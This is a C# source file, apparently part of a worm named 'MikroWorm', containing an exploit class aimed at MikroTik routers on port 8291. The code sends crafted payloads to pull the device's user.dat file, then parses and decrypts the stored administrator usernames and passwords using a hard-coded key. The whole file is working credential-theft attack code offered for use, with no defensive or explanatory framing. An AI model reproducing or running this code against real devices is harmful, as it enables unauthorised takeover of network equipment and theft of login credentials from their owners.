using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace MikroWorm
{
    public class Exploit
    {
        public static string DecryptionKey = "283i4jfkai3389";
        public static int BufferSize = 1024;

        public static List<User> GetUsers(string ip, int port = 8291)
        {
            IPAddress addr = IPAddress.Parse(ip);

            byte[] ResponseBytes = new byte[BufferSize];
            using (Socket Socket = new Socket(addr.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
            {
                Socket.ReceiveTimeout = 3000;
                Socket.SendTimeout = 3000;

                try { Socket.Connect(new IPEndPoint(addr, port)); }
                catch (SocketException ex) { Console.WriteLine("Target not connecting!"); }
                catch (Exception ex) { Console.WriteLine($"Unknown error: {ex}"); }

                Socket.Send(Payloads.Hello_Payload);

                ResponseBytes = new byte[BufferSize];
                Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None);

                // inject session id into dump payload
                byte[] DumpPayload = Payloads.UserDatPayload;
                DumpPayload[19] = ResponseBytes[38];
                Socket.Send(DumpPayload); // send malicious payload

                ResponseBytes = new byte[BufferSize];
                Socket.Receive(ResponseBytes, BufferSize, SocketFlags.None); // recieve byte array of user.dat
            }

            ResponseBytes = ResponseBytes.Skip(55).ToArray(); // remove header
            List<byte[]> ByteUsersList = ResponseBytes.Split(new byte[] { 0xff }).Skip(1).ToList(); // split user.dat up by userlist

            List<User> Users = new List<User>();
            foreach (byte[] dumpeduser in ByteUsersList) // loop all dumped users
            {
                try
                {
                    byte[] usernameArray = dumpeduser.Split(new byte[] { 0x01, 0x00, 0x00, 0x21 })[1];
                    byte[] passwordArray = dumpeduser.Split(new byte[] { 0x11, 0x00, 0x00, 0x21 })[1];

                    byte[] usernameBytes = usernameArray.Skip(1).Take(usernameArray[0]).ToArray();
                    byte[] passwordBytes = passwordArray.Skip(1).Take(usernameArray[0]).ToArray();

                    byte[] KeyBytes = usernameBytes.Concat(Encoding.ASCII.GetBytes(DecryptionKey)).ToArray();
                    byte[] Key = MD5.Create().ComputeHash(KeyBytes);

                    string password = "";
                    for (int i = 0; i < passwordBytes.Length; i++)
                        password += (char)(passwordBytes[i] ^ Key[i % Key.Length]);

                    Users.Add(new User(Encoding.ASCII.GetString(usernameBytes), password));
                }
                catch { }
            }

            return Users;
        }
    }
}